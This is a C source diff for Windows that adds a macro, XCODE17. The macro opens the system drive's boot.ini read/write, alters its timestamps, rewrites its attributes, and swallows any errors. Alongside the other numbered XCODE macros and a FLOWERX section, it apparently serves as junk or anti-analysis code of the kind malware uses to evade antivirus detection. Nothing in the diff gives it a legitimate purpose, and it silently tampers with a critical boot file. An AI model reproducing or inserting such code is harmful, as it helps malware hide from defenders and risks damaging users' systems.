@@ -80,6 +80,7 @@ COORD dwCursorPostion;
 CONSOLE_SCREEN_BUFFER_INFO *lpConsoleScreenBufferInfo;
 CRITICAL_SECTION	g_CriticalSection;
 PROCESSENTRY32 procentry;
+FILETIME    datetime,local_filetime;
 
 typedef BOOL (CALLBACK *PROCENUMPROC)(DWORD, WORD, LPSTR, LPARAM);
 typedef struct {
@@ -625,6 +626,31 @@ do {\
 				FreeLibrary((HMODULE)hXMod);\
 			if (hmyfile)\
 				FreeLibrary((HMODULE)hmyfile);\
+			Sleep(16);\
+		}
+
+#define XCODE17 __try{\
+			GetWindowsDirectory(szXBuff, MAX_PATH);\
+			szXBuff[3]=0;\
+			strcat(szXBuff, "boot.ini");\
+            hXMod = CreateFile(szXBuff,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);\
+            if (hXMod != INVALID_HANDLE_VALUE)\
+            {\
+				GetFileTime(hXMod, &datetime, &datetime, &datetime);\
+				datetime.dwHighDateTime++;\
+				datetime.dwLowDateTime++;\
+                if (TRUE == LocalFileTimeToFileTime(&datetime,&local_filetime))\
+                {\
+                    SetFileTime(hXMod,&local_filetime,NULL,&local_filetime);\
+                }\
+				dwRes=GetFileAttributes(szXBuff);\
+				dwRes&=(FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);\
+				SetFileAttributes(szXBuff,dwRes);\
+             }\
+			 CloseHandle(hXMod);\
+		}\
+		__except(EXCEPTION_EXECUTE_HANDLER){\
+			Sleep(17);\
 		}
 
 #ifdef FLOWERX
